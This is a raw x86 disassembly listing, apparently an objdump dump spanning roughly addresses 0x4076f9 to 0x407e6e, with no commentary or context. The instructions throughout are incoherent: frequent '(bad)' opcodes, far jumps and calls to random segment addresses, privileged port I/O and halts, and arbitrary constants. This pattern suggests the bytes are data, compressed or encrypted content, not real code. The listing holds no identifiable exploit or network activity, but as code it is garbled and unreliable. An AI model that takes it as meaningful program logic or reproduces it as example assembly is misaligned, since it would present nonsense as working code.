  4076f9:	and    al,0x0
  4076fb:	daa    
  4076fc:	lahf   
  4076fd:	jge    0x407735
  4076ff:	and    bl,BYTE PTR [edx]
  407701:	push   ss
  407702:	cmp    eax,0xaa0355eb
  407707:	inc    esp
  407708:	mov    ecx,DWORD PTR [ebx]
  40770a:	xchg   BYTE PTR [ecx],dh
  40770c:	std    
  40770d:	clc    
  40770e:	nop
  40770f:	mov    dl,BYTE PTR [edx-0x26]
  407712:	jo     0x4076a7
  407714:	jmp    0xfd77:0x186fe1ea
  40771b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40771c:	and    al,0xeb
  40771e:	add    edx,DWORD PTR [eax-0x6af5a8bc]
  407724:	and    al,bh
  407726:	sahf   
  407727:	pop    edx
  407728:	push   ds
  407729:	mov    ds:0xc08f56b2,eax
  40772e:	xchg   esi,eax
  40772f:	lock scas eax,DWORD PTR es:[edi]
  407731:	mov    al,ds:0xeba5be25
  407736:	adc    ah,BYTE PTR [edx-0x28]
  407739:	repnz or al,0xae
  40773c:	push   ecx
  40773d:	dec    esp
  40773e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40773f:	sbb    DWORD PTR [esi],0xffffff9a
  407742:	(bad)  
  407743:	adc    al,0x5c
  407745:	pop    eax
  407746:	add    eax,DWORD PTR [eax+0x5e]
  407749:	and    bh,cl
  40774b:	lahf   
  40774c:	enter  0x9807,0x3e
  407750:	scas   al,BYTE PTR es:[edi]
  407751:	mov    dh,0xe3
  407753:	mov    edx,0xa8e25446
  407758:	cmp    al,0x55
  40775a:	mov    BYTE PTR [esi+0x7b],dh
  40775d:	loop   0x407716
  40775f:	popf   
  407760:	xchg   esp,eax
  407761:	stos   DWORD PTR es:[edi],eax
  407762:	getsec 
  407764:	aas    
  407765:	cmp    eax,0x22795f0d
  40776a:	(bad)  
  40776b:	jp     0x4077de
  40776d:	push   0xffffffe7
  40776f:	in     al,dx
  407770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407771:	xchg   ebp,eax
  407772:	adc    ebp,eax
  407774:	call   0xdc45:0x1e7c2999
  40777b:	fdiv   DWORD PTR [ebp-0x65]
  40777e:	or     BYTE PTR [edi+0x40f565d7],0xcd
  407785:	and    ebx,DWORD PTR [esi-0x75]
  407788:	aad    0x46
  40778a:	xchg   ebp,eax
  40778b:	sar    BYTE PTR [ebx+0x12c61613],1
  407791:	cmp    ebx,DWORD PTR [edi]
  407793:	enter  0xa34c,0x8e
  407797:	sub    DWORD PTR [edi],edx
  407799:	dec    eax
  40779a:	push   edi
  40779b:	(bad)  
  40779c:	popa   
  40779d:	retf   0xe4b
  4077a0:	mov    ah,0xbe
  4077a2:	mov    ch,0xeb
  4077a4:	pop    ebx
  4077a5:	popa   
  4077a6:	mov    dh,0x11
  4077a8:	popf   
  4077a9:	dec    ebp
  4077aa:	lock loope 0x407782
  4077ad:	imul   eax,eax,0x8e41c288
  4077b3:	or     BYTE PTR [esi-0x205b4354],ah
  4077b9:	pop    ecx
  4077ba:	mov    DWORD PTR [ebx],esp
  4077bc:	adc    bl,BYTE PTR [eax-0x60]
  4077bf:	sahf   
  4077c0:	loop   0x4077e3
  4077c2:	lea    edi,[esi]
  4077c4:	in     al,0xd9
  4077c6:	mov    ds:0xd1e3e6b2,al
  4077cb:	je     0x407797
  4077cd:	fdiv   QWORD PTR [ebp+0x54]
  4077d0:	rcr    BYTE PTR [ebx],0xdf
  4077d3:	es mov ebp,0xd59a06e0
  4077d9:	test   al,0x1d
  4077db:	sbb    ah,BYTE PTR [ebx+ecx*8-0x59]
  4077df:	outs   dx,DWORD PTR ds:[esi]
  4077e0:	xchg   edi,eax
  4077e1:	adc    al,0x92
  4077e3:	mov    DWORD PTR [ecx+0x6],eax
  4077e6:	push   edi
  4077e7:	inc    ebx
  4077e8:	push   eax
  4077e9:	mov    dh,BYTE PTR ds:0x2ffbd9cc
  4077ef:	test   BYTE PTR [esi+ebx*1+0x38],ch
  4077f3:	jl     0x4077e5
  4077f5:	mov    edx,0x90130d5b
  4077fa:	or     DWORD PTR [edi],0x16
  4077fd:	addr16 (bad) 
  4077ff:	jbe    0x407802
  407801:	repz push esp
  407803:	jg     0x40785e
  407805:	lods   eax,DWORD PTR ds:[esi]
  407806:	nop
  407807:	pop    eax
  407808:	icebp  
  407809:	stos   DWORD PTR es:[edi],eax
  40780a:	xchg   edi,eax
  40780b:	push   ebx
  40780c:	mov    dh,0x17
  40780e:	fucomip st,st(3)
  407810:	sbb    al,0x30
  407812:	dec    edx
  407813:	(bad)  
  407814:	(bad)  
  407815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407816:	(bad)  
  407818:	xlat   BYTE PTR ds:[ebx]
  407819:	mov    bl,0x56
  40781b:	loop   0x407801
  40781d:	mov    eax,0xf2c3377f
  407822:	mov    ch,0x70
  407824:	out    0x45,al
  407826:	push   ebx
  407827:	mov    ebx,0xc4fbaf57
  40782c:	jns    0x407878
  40782e:	add    DWORD PTR [ebp+edi*8+0x59f84988],ebp
  407835:	adc    esi,DWORD PTR [ebx]
  407837:	and    eax,DWORD PTR [ecx+ebp*2]
  40783a:	cmp    DWORD PTR [edi+0x7e37e5df],ebp
  407840:	fwait
  407841:	mov    gs,edx
  407843:	and    bl,BYTE PTR [ebx+eax*2]
  407846:	inc    esp
  407847:	cdq    
  407848:	jno    0x407855
  40784a:	cmc    
  40784b:	mov    esi,0x81b008d3
  407850:	dec    ebp
  407851:	js     0x407823
  407853:	or     ebp,DWORD PTR ds:0xaf98bc4b
  407859:	sbb    al,0x2a
  40785b:	out    0xce,al
  40785d:	sti    
  40785e:	cmp    DWORD PTR [ebp+0x4b],ebx
  407861:	or     DWORD PTR [esi-0x7bfeb6eb],0x65
  407868:	jmp    0x8e53:0xca9dd3df
  40786f:	xchg   edi,eax
  407870:	xchg   edx,eax
  407872:	and    edx,edx
  407874:	stos   DWORD PTR es:[edi],eax
  407875:	aad    0xd3
  407877:	pop    es
  407878:	hlt    
  407879:	fbstp  TBYTE PTR [ebp+eiz*2+0x44684bd4]
  407880:	mov    eax,gs:0xfdeb6dca
  407886:	icebp  
  407887:	pop    edi
  407888:	pop    ss
  407889:	cld    
  40788a:	test   ebp,eax
  40788c:	add    DWORD PTR [esi-0xb],ebx
  40788f:	mov    WORD PTR [edi-0x46],es
  407892:	aaa    
  407893:	fisub  WORD PTR [edx-0x77]
  407896:	retf   
  407897:	push   ebx
  407898:	xchg   esi,eax
  407899:	fs pushf 
  40789b:	push   esp
  40789c:	jle    0x4078c2
  40789e:	aad    0x55
  4078a0:	jmp    0xbf0abfa1
  4078a5:	in     al,dx
  4078a6:	mov    BYTE PTR [edx+0x1a],dl
  4078a9:	mov    eax,0x3a51cea7
  4078ae:	xchg   ebx,eax
  4078af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078b0:	das    
  4078b1:	stc    
  4078b2:	imul   ecx,DWORD PTR [edi+0x76ed16b3],0xffffffe4
  4078b9:	push   esi
  4078ba:	inc    ebx
  4078bb:	adc    al,0x9e
  4078bd:	fwait
  4078be:	jbe    0x407907
  4078c0:	push   ecx
  4078c1:	or     al,0xfe
  4078c3:	lods   eax,DWORD PTR ds:[esi]
  4078c4:	xor    BYTE PTR ds:0x13e6886c,ah
  4078ca:	dec    ebx
  4078cb:	ins    BYTE PTR es:[edi],dx
  4078cc:	xlat   BYTE PTR ds:[ebx]
  4078cd:	lods   al,BYTE PTR ds:[esi]
  4078ce:	ror    BYTE PTR [di],cl
  4078d1:	xor    dh,al
  4078d3:	dec    ebp
  4078d4:	sub    al,BYTE PTR [edx+0x44e28cf2]
  4078da:	jecxz  0x4078a4
  4078dc:	out    0xdf,eax
  4078de:	push   ds
  4078df:	inc    ebp
  4078e0:	outs   dx,BYTE PTR ds:[esi]
  4078e1:	fdivr  DWORD PTR es:[esi+0x27]
  4078e6:	dec    ecx
  4078e7:	sti    
  4078e8:	adc    eax,0x7f77e4c1
  4078ed:	js     0x407888
  4078ef:	imul   esp,DWORD PTR [esi],0x11
  4078f2:	or     al,0x59
  4078f4:	lds    eax,FWORD PTR [eax+esi*2-0x32ea545f]
  4078fb:	int    0x58
  4078fd:	loop   0x4078b3
  4078ff:	and    al,0x1f
  407901:	jmp    0x9309:0xa64873fe
  407908:	mov    ebx,0x18b7064c
  40790d:	pop    eax
  40790e:	js     0x407913
  407910:	cs int 0xe0
  407913:	daa    
  407914:	fxch   st(5)
  407916:	inc    bh
  407918:	mov    eax,0xc900e5ca
  40791d:	cmp    DWORD PTR [edx],ecx
  40791f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407920:	xchg   ebx,eax
  407921:	dec    eax
  407922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407923:	dec    esi
  407924:	into   
  407925:	add    edx,DWORD PTR [eax+0x6f3df860]
  40792b:	cwde   
  40792c:	in     al,0x37
  40792e:	sbb    eax,0x35d91350
  407933:	aam    0x75
  407935:	jp     0x407956
  407937:	adc    al,0xfd
  407939:	sub    BYTE PTR [ecx+eax*1-0x15e42c86],0xfc
  407941:	lahf   
  407942:	dec    ebp
  407943:	push   esi
  407944:	mov    cl,0x2f
  407946:	(bad)  
  407947:	dec    ebx
  407948:	aaa    
  407949:	mov    edx,0xc44042bf
  40794e:	dec    esi
  40794f:	pusha  
  407950:	pop    esp
  407951:	adc    BYTE PTR [ecx+0x73],ah
  407954:	pusha  
  407955:	fstp   DWORD PTR [ebx+0x650bb080]
  40795b:	xchg   esp,eax
  40795c:	stc    
  40795d:	adc    al,0xd6
  40795f:	enter  0xdd,0x98
  407963:	dec    bl
  407965:	xchg   esi,eax
  407966:	dec    esp
  407967:	dec    esp
  407968:	stc    
  407969:	mov    ch,0x2a
  40796b:	xchg   DWORD PTR [eax],eax
  40796d:	retf   0x4977
  407970:	scas   eax,DWORD PTR es:[edi]
  407971:	adc    al,0xc9
  407973:	ds pop ecx
  407975:	ret    
  407976:	cmp    al,BYTE PTR [edx+ebp*8+0x59]
  40797a:	inc    ebp
  40797b:	jmp    0x34477a0c
  407980:	daa    
  407981:	or     eax,0x1c610149
  407986:	ins    BYTE PTR es:[edi],dx
  407987:	cmp    DWORD PTR [ecx+0x66],0x96a93523
  40798e:	in     eax,0x99
  407990:	lock gs pop edi
  407993:	loopne 0x407a0e
  407995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407996:	mov    eax,0x33893a79
  40799b:	je     0x407993
  40799d:	fild   WORD PTR [ebp-0x1b]
  4079a0:	pop    esi
  4079a1:	fwait
  4079a2:	mov    ah,0x37
  4079a4:	cmp    al,0xb0
  4079a6:	leave  
  4079a7:	je     0x40792e
  4079a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079aa:	jo     0x40795d
  4079ac:	call   0x1d0f:0xd1f02b8d
  4079b3:	ret    
  4079b4:	jnp    0x407a26
  4079b6:	or     al,0x91
  4079b8:	icebp  
  4079b9:	in     al,dx
  4079ba:	cmp    eax,edx
  4079bc:	inc    esp
  4079bd:	js     0x407a3b
  4079bf:	cmp    eax,0x5892b887
  4079c4:	lds    ecx,FWORD PTR ds:0xa33b82b2
  4079ca:	(bad)  
  4079cb:	mov    eax,ds:0x13b8c709
  4079d0:	or     DWORD PTR [ebx+0x1323eb46],edx
  4079d6:	fs inc esi
  4079d8:	aaa    
  4079d9:	add    al,0xea
  4079db:	push   ds
  4079dc:	jb     0x4079eb
  4079de:	push   ds
  4079df:	aas    
  4079e0:	repnz pop edx
  4079e2:	jge    0x40796c
  4079e4:	shl    BYTE PTR [esi],1
  4079e6:	pop    ebx
  4079e7:	adc    eax,0x9dcc0eed
  4079ec:	enter  0x5e15,0xa1
  4079f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079f1:	sbb    eax,0x9ad2603c
  4079f6:	mov    ah,0xe4
  4079f8:	(bad)  
  4079f9:	stos   DWORD PTR es:[edi],eax
  4079fa:	adc    DWORD PTR [edi+edx*1+0x12879bfc],esi
  407a01:	sub    al,BYTE PTR [ebx]
  407a03:	jbe    0x407a42
  407a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a06:	das    
  407a07:	mov    ebp,0x3b21fa7e
  407a0c:	push   esp
  407a0d:	mov    dl,0x14
  407a0f:	inc    eax
  407a10:	mov    ecx,0xe63bd152
  407a15:	scas   al,BYTE PTR es:[edi]
  407a16:	out    0xf,eax
  407a18:	fucomp st(0)
  407a1a:	pushf  
  407a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a1c:	adc    bh,BYTE PTR [ebx-0x8591202]
  407a22:	inc    esp
  407a23:	out    0x21,al
  407a25:	test   DWORD PTR [edi+0x4e6900a5],0xb2eceb79
  407a2f:	mov    WORD PTR [esi+0x68c16db7],ds
  407a35:	pop    ebx
  407a36:	das    
  407a37:	sub    BYTE PTR [edx+0x60],al
  407a3a:	(bad)  
  407a3b:	popa   
  407a3c:	out    0xa0,al
  407a3e:	xchg   edx,eax
  407a3f:	je     0x4079f7
  407a41:	in     eax,dx
  407a42:	and    al,0x3c
  407a44:	imul   edx,ebp,0x25
  407a47:	adc    al,0x11
  407a49:	fnsave [esi-0x43]
  407a4c:	daa    
  407a4d:	fistp  WORD PTR [edi]
  407a4f:	ins    BYTE PTR es:[edi],dx
  407a50:	push   ecx
  407a51:	and    al,0x4a
  407a53:	pop    ecx
  407a54:	pusha  
  407a55:	(bad)  
  407a56:	rol    BYTE PTR [edi+ebp*8],0xb
  407a5a:	pop    esp
  407a5b:	jb     0x407aba
  407a5d:	jb     0x407a48
  407a5f:	sub    edx,DWORD PTR [ebp+0x77]
  407a62:	cli    
  407a63:	rol    DWORD PTR [ebp-0x5facab1c],1
  407a69:	mov    ebx,0x9187b06a
  407a6e:	fcomp  QWORD PTR ds:0x132aff53
  407a74:	sub    DWORD PTR [ebp+0x248ea242],esp
  407a7a:	xor    BYTE PTR [ebp+0x60],cl
  407a7d:	xor    edx,ebp
  407a7f:	dec    esi
  407a80:	ret    
  407a81:	clc    
  407a82:	into   
  407a83:	loopne 0x407a43
  407a85:	mov    bl,0x7
  407a87:	sbb    al,0x40
  407a89:	push   edi
  407a8a:	xor    BYTE PTR [ecx+0x11],0x21
  407a8e:	nop
  407a8f:	imul   DWORD PTR [edi-0x38a1445]
  407a95:	mov    esi,0x74fee3c5
  407a9a:	inc    esi
  407a9b:	scas   al,BYTE PTR es:[edi]
  407a9c:	fild   WORD PTR [edi]
  407a9e:	adc    BYTE PTR [eax-0x57bdf414],bl
  407aa4:	sar    dh,cl
  407aa6:	sar    BYTE PTR [ecx+0x2c8ea9a2],cl
  407aac:	or     ecx,0x849882dc
  407ab2:	jmp    0x3ce401bd
  407ab7:	cwde   
  407ab8:	retf   
  407ab9:	call   0xeb3b566d
  407abe:	repnz scas eax,DWORD PTR es:[edi]
  407ac0:	xchg   ebp,eax
  407ac1:	faddp  st(4),st
  407ac3:	xchg   esp,eax
  407ac4:	mov    ds:0xc6efaee9,al
  407ac9:	jle    0x407ace
  407acb:	add    BYTE PTR [edi-0x11937d8b],bh
  407ad1:	mov    bl,0x6e
  407ad3:	loop   0x407b26
  407ad5:	retf   
  407ad6:	scas   eax,DWORD PTR es:[edi]
  407ad7:	mov    dl,0xc6
  407ad9:	cwde   
  407ada:	add    eax,0x8393fd55
  407adf:	dec    edi
  407ae0:	int3   
  407ae1:	outs   dx,DWORD PTR ds:[esi]
  407ae2:	mov    BYTE PTR [ecx+edi*4-0x3ca83d27],dh
  407ae9:	cmp    esp,esi
  407aeb:	ds icebp 
  407aed:	repnz mov eax,0x47de388d
  407af3:	sbb    al,0x24
  407af5:	and    BYTE PTR [ecx+0x5d],0xa7
  407af9:	out    0xf0,eax
  407afb:	je     0x407b08
  407afd:	xchg   edx,eax
  407afe:	xchg   di,ax
  407b00:	mov    ss,WORD PTR [esi-0x5c]
  407b03:	bound  ecx,QWORD PTR [edx+ecx*1-0x39]
  407b07:	nop
  407b08:	mov    edx,0x1f3c4d8a
  407b0d:	pcmpgtb mm6,mm6
  407b10:	nop
  407b11:	adc    eax,0xa8b1ec8d
  407b16:	cmp    DWORD PTR [ebp+0x21],eax
  407b19:	or     BYTE PTR [ebp+0x3e],ah
  407b1c:	js     0x407b44
  407b1e:	dec    ebx
  407b1f:	scas   eax,DWORD PTR es:[edi]
  407b20:	pop    ds
  407b21:	or     eax,0xeaffd19b
  407b26:	jg     0x407b89
  407b28:	inc    BYTE PTR [edi-0x30]
  407b2b:	test   al,0xcb
  407b2d:	dec    edx
  407b2e:	loope  0x407b53
  407b30:	fistp  QWORD PTR [ebx]
  407b32:	push   ebp
  407b33:	ins    DWORD PTR es:[edi],dx
  407b34:	xor    cl,BYTE PTR [edi+0x7b]
  407b37:	mov    edi,0x4a179d7
  407b3c:	mov    esp,DWORD PTR [eax+0x31]
  407b3f:	mov    ds:0xad2404ac,al
  407b44:	mov    ecx,0xd363d8b9
  407b49:	add    edi,ecx
  407b4b:	out    0x93,al
  407b4d:	out    0xff,al
  407b4f:	push   ecx
  407b50:	aaa    
  407b51:	mov    esp,ebp
  407b53:	inc    ecx
  407b54:	fstp   st(4)
  407b56:	inc    esi
  407b57:	lods   al,BYTE PTR ds:[esi]
  407b58:	dec    eax
  407b59:	popa   
  407b5a:	mov    cl,0xf2
  407b5c:	xchg   edi,eax
  407b5d:	jecxz  0x407b5c
  407b5f:	jg     0x407bc6
  407b61:	fmul   DWORD PTR [ebx+0x2]
  407b64:	or     BYTE PTR [edx],0xbb
  407b67:	pop    es
  407b68:	dec    esp
  407b69:	mov    al,ds:0x4ec6dc19
  407b6e:	pop    esp
  407b6f:	lahf   
  407b70:	jecxz  0x407b1d
  407b72:	xor    bl,BYTE PTR [eax+0x3b18598b]
  407b78:	shr    DWORD PTR [esi+0x1b11eb2d],0x40
  407b7f:	repnz xor ah,BYTE PTR [ecx-0x7d]
  407b83:	mov    esi,0xe1f62414
  407b88:	pop    ss
  407b89:	sbb    dh,0x63
  407b8c:	push   ebp
  407b8d:	push   ss
  407b8e:	add    al,0xc3
  407b90:	aaa    
  407b91:	add    eax,0x175f9f1b
  407b96:	ins    DWORD PTR es:[edi],dx
  407b97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b98:	test   esi,eax
  407b9a:	popf   
  407b9b:	mov    ebp,0xdc8fc470
  407ba0:	pusha  
  407ba1:	mov    esi,0x4a168454
  407ba6:	xchg   edx,eax
  407ba7:	(bad)  
  407ba8:	or     al,0x25
  407baa:	out    dx,al
  407bab:	cmp    dl,al
  407bad:	je     0x407bd0
  407baf:	xchg   esp,eax
  407bb0:	mov    ds:0x94cfdaef,eax
  407bb5:	cmp    DWORD PTR [ecx-0x5c],ebp
  407bb8:	push   ss
  407bb9:	cmp    dh,ch
  407bbb:	mov    ecx,0xb0f34577
  407bc0:	xor    al,0xc8
  407bc2:	fiadd  DWORD PTR [ecx]
  407bc4:	add    ebx,DWORD PTR ds:0xfae53a1c
  407bca:	test   al,0xda
  407bcc:	clc    
  407bcd:	lahf   
  407bce:	mov    esi,0xe617b41d
  407bd3:	jbe    0x407bc5
  407bd5:	or     al,0x51
  407bd7:	mov    ah,0xe1
  407bd9:	push   0xfffffff2
  407bdb:	loope  0x407b78
  407bdd:	fwait
  407bde:	lahf   
  407bdf:	(bad)  [esi-0x6f9cff91]
  407be5:	outs   dx,DWORD PTR ds:[esi]
  407be6:	lods   al,BYTE PTR ds:[esi]
  407be7:	loop   0x407ba0
  407be9:	push   edx
  407bea:	sti    
  407beb:	cli    
  407bec:	nop
  407bed:	dec    esp
  407bee:	jmp    0x407bb0
  407bf0:	jno    0x407bf9
  407bf2:	mov    al,ds:0x7ef903cf
  407bf7:	pusha  
  407bf8:	test   eax,0xfae0ce7d
  407bfd:	xor    DWORD PTR [ecx+0x47305bc],0x671b8af1
  407c07:	mov    bh,0xd6
  407c09:	dec    esi
  407c0a:	jnp    0x407bba
  407c0c:	int3   
  407c0d:	ss xor ah,bl
  407c10:	scas   eax,DWORD PTR es:[edi]
  407c11:	push   eax
  407c12:	inc    BYTE PTR [ecx-0x47]
  407c15:	outs   dx,DWORD PTR ds:[esi]
  407c16:	add    al,BYTE PTR [esi+0x50]
  407c19:	sub    eax,0xfc300803
  407c1e:	call   0xd23c31c5
  407c23:	cmp    al,0x8
  407c25:	(bad)  
  407c26:	jmp    0x407c69
  407c28:	jb     0x407bba
  407c2a:	js     0x407bc5
  407c2c:	fisub  WORD PTR [edx]
  407c2e:	xchg   ecx,eax
  407c2f:	cdq    
  407c30:	dec    eax
  407c31:	or     eax,0xeb6c49f8
  407c36:	inc    ebx
  407c37:	shl    BYTE PTR [ecx+edi*2],1
  407c3a:	js     0x407c49
  407c3c:	adc    eax,0xffab2197
  407c41:	mov    ecx,DWORD PTR [esi]
  407c43:	in     al,dx
  407c44:	daa    
  407c45:	inc    esp
  407c46:	jo     0x407c40
  407c48:	retf   0xfeb6
  407c4b:	fisttp DWORD PTR [edi+ecx*1-0xf]
  407c4f:	arpl   WORD PTR [ecx-0x14],di
  407c52:	stos   DWORD PTR es:[edi],eax
  407c53:	pop    esi
  407c54:	xchg   esp,eax
  407c55:	es std 
  407c57:	sub    dl,ah
  407c59:	inc    esi
  407c5a:	mov    edx,0x6a33d430
  407c5f:	sahf   
  407c60:	mov    dh,0xd1
  407c62:	sbb    eax,0x2d560770
  407c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c68:	js     0x407ca0
  407c6a:	push   ebx
  407c6b:	inc    edx
  407c6c:	out    dx,al
  407c6d:	xchg   edi,eax
  407c6e:	(bad)  
  407c6f:	les    ebx,FWORD PTR [ecx+esi*4]
  407c72:	test   BYTE PTR [edx-0x6caf308e],dl
  407c78:	fisubr DWORD PTR [ebp-0x37]
  407c7b:	in     eax,dx
  407c7c:	dec    edi
  407c7d:	retf   
  407c7e:	into   
  407c7f:	sub    eax,0x1c01392f
  407c84:	cdq    
  407c85:	call   0x2ca78798
  407c8a:	das    
  407c8b:	jae    0x407d0b
  407c8d:	jae    0x407c13
  407c8f:	es pop esp
  407c91:	cmc    
  407c92:	cmp    al,0xf2
  407c94:	stos   BYTE PTR es:[edi],al
  407c95:	lods   al,BYTE PTR ds:[esi]
  407c96:	mov    eax,ds:0x394e6057
  407c9b:	retf   
  407c9c:	cmc    
  407c9d:	loopne 0x407c71
  407c9f:	shl    BYTE PTR [edx],1
  407ca1:	not    dl
  407ca3:	fxch   st(0)
  407ca5:	jae    0x407c41
  407ca7:	adc    eax,0x12932a91
  407cac:	mov    cl,0x23
  407cae:	sbb    al,0xb4
  407cb0:	iret   
  407cb1:	jle    0x407c6f
  407cb3:	les    esp,FWORD PTR [esi+0x6fdf0543]
  407cb9:	mov    esi,0xb0317317
  407cbe:	pop    ds
  407cbf:	pusha  
  407cc0:	mov    edx,0xefe98c00
  407cc5:	xor    cl,ah
  407cc7:	and    eax,DWORD PTR [edx+ebx*8]
  407cca:	xor    ebp,DWORD PTR [esi+0x1f]
  407ccd:	inc    eax
  407cce:	int3   
  407ccf:	outs   dx,BYTE PTR ds:[esi]
  407cd0:	pop    ecx
  407cd1:	xchg   esi,eax
  407cd2:	jge    0x407d24
  407cd4:	cdq    
  407cd5:	sar    BYTE PTR [ecx-0x265b066f],cl
  407cdb:	aad    0x48
  407cdd:	pop    es
  407cde:	stos   DWORD PTR es:[edi],eax
  407cdf:	sbb    BYTE PTR [esi],al
  407ce1:	xchg   BYTE PTR [esi],ch
  407ce3:	sbb    ecx,DWORD PTR [ebx-0x49]
  407ce6:	cmp    bh,dh
  407ce8:	dec    esp
  407ce9:	call   0xe98af57d
  407cee:	jmp    0x6681:0xecc7e693
  407cf5:	mov    edx,0x133f71d3
  407cfa:	in     al,0x6d
  407cfc:	xor    DWORD PTR [esi-0x4992b93f],ecx
  407d02:	jne    0x407cbf
  407d04:	in     eax,0x8f
  407d06:	stc    
  407d07:	sub    BYTE PTR [edx],0x2
  407d0a:	add    eax,0x6c3569f8
  407d0f:	in     al,0x9b
  407d11:	pop    ebp
  407d12:	mov    ss,WORD PTR [ecx+0x55e1adaf]
  407d18:	push   esp
  407d19:	(bad)  
  407d1a:	in     al,dx
  407d1b:	xchg   esi,eax
  407d1c:	in     eax,0x34
  407d1e:	test   BYTE PTR [esi+esi*8+0x38],cl
  407d22:	(bad)  
  407d23:	imul   esi,DWORD PTR [edx-0x400c64c9],0xfffffff2
  407d2a:	nop
  407d2b:	shl    DWORD PTR [eax-0x50],cl
  407d2e:	(bad)
  407d32:	inc    eax
  407d33:	retf   0x883d
  407d36:	(bad)  
  407d37:	shr    BYTE PTR [ecx],cl
  407d39:	cli    
  407d3a:	outs   dx,DWORD PTR ds:[esi]
  407d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d3c:	test   eax,0x56a17c10
  407d41:	inc    esi
  407d42:	cdq    
  407d43:	sub    ebp,eax
  407d45:	sub    ebx,DWORD PTR [esi+esi*8]
  407d48:	mov    bh,0xf8
  407d4a:	lea    edx,[esi+0x2]
  407d4d:	jno    0x407d1f
  407d4f:	sub    ebx,DWORD PTR [ebp*2+0x59d0679c]
  407d56:	push   esp
  407d57:	cmp    eax,0x12a5f6c6
  407d5c:	clc    
  407d5d:	push   esi
  407d5e:	pop    ebp
  407d5f:	and    DWORD PTR [eax-0xac5be0c],esi
  407d65:	mov    esi,edi
  407d67:	cwde   
  407d68:	loop   0x407d31
  407d6a:	leave  
  407d6b:	inc    ebp
  407d6c:	faddp  st(1),st
  407d6e:	push   cs
  407d6f:	hlt    
  407d70:	mov    ebx,0x94e5ad97
  407d75:	add    eax,0x561f438
  407d7a:	imul   ebx
  407d7c:	and    BYTE PTR [esi+ebx*1+0x24fa44f1],cl
  407d83:	ins    BYTE PTR es:[edi],dx
  407d84:	mov    BYTE PTR [esi+0x31],bl
  407d87:	dec    edx
  407d88:	or     eax,0x294b42e0
  407d8d:	jne    0x407d77
  407d8f:	or     BYTE PTR [ecx-0x4d],bh
  407d92:	repz add DWORD PTR [eax],ebx
  407d95:	pop    edx
  407d96:	push   es
  407d97:	sbb    BYTE PTR ds:0x4cd6ecb5,bh
  407d9d:	push   edx
  407d9e:	push   ds
  407d9f:	rol    BYTE PTR [ebp+edx*4+0x6b],cl
  407da3:	lds    esi,FWORD PTR ds:0x5e91309
  407da9:	fcmovb st,st(5)
  407dab:	adc    ch,BYTE PTR [edx]
  407dad:	xchg   esp,eax
  407dae:	mov    ds:0x13d9c306,al
  407db3:	enter  0x1b1e,0x73
  407db7:	mov    esp,gs
  407db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dba:	add    BYTE PTR [esi],ah
  407dbc:	out    dx,al
  407dbd:	fwait
  407dbe:	test   eax,0x83734a4d
  407dc3:	push   esi
  407dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dc5:	push   es
  407dc6:	in     eax,dx
  407dc7:	mov    WORD PTR [ecx],cs
  407dc9:	mov    dl,0xe0
  407dcb:	stos   DWORD PTR es:[edi],eax
  407dcc:	xchg   ecx,eax
  407dcd:	cmp    ebx,edx
  407dcf:	push   es
  407dd0:	xor    al,BYTE PTR [esi+0x71]
  407dd3:	push   esi
  407dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dd5:	iret   
  407dd6:	jmp    0xfca2:0x7ea96f14
  407ddd:	lds    edi,FWORD PTR [edx+0x6]
  407de0:	dec    ebp
  407de1:	test   BYTE PTR [eax+eiz*4],bh
  407de4:	inc    esi
  407de5:	push   0x33
  407de7:	pop    ebx
  407de8:	jp     0x407dec
  407dea:	cwde   
  407deb:	rcr    esp,1
  407ded:	inc    esi
  407dee:	gs (bad) 
  407df0:	sahf   
  407df1:	xlat   BYTE PTR ds:[ebx]
  407df2:	mov    ebx,0xbf7d0464
  407df7:	mov    DWORD PTR [edx-0x42475b23],esi
  407dfd:	rcl    BYTE PTR [ebx],0x8b
  407e00:	jmp    0xcf6f:0x8a4981c4
  407e07:	cmp    al,0x92
  407e09:	xor    BYTE PTR [ecx+0x4e],0x78
  407e0d:	sub    ch,BYTE PTR [ebp-0x10]
  407e10:	sub    dh,cl
  407e12:	pushf  
  407e13:	or     eax,ebx
  407e15:	inc    edx
  407e16:	mov    WORD PTR [ecx-0x44924d8c],?
  407e1c:	mov    al,ds:0x91639c4d
  407e21:	inc    edi
  407e22:	jmp    0x407dd2
  407e24:	cmp    DWORD PTR [ecx+edi*8-0x6b22d7fa],eax
  407e2b:	mul    edx
  407e2d:	mov    al,ds:0xc8000e0b
  407e32:	mov    DWORD PTR [ebx],esi
  407e34:	dec    edx
  407e35:	xchg   ebp,eax
  407e36:	test   al,0xf3
  407e38:	jl     0x407e6a
  407e3a:	or     ebp,edx
  407e3c:	cmp    DWORD PTR [esi-0x1e66b68a],0x6c
  407e43:	test   esp,ebp
  407e45:	fidiv  WORD PTR [eax-0x686e908]
  407e4b:	xor    bl,al
  407e4d:	ret    0x1530
  407e50:	nop
  407e51:	mov    cl,0x41
  407e53:	stos   DWORD PTR es:[edi],eax
  407e54:	(bad)  
  407e55:	jge    0x407e7c
  407e57:	js     0x407e3d
  407e59:	sub    dh,BYTE PTR [ebp-0x527125a1]
  407e5f:	push   es
  407e60:	add    eax,0x539dc57c
  407e65:	test   al,0x3
  407e67:	sbb    DWORD PTR [ecx],eax
  407e69:	ins    BYTE PTR es:[di],dx
  407e6b:	cwde   
  407e6c:	(bad)  
  407e6d:	nop
  407e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
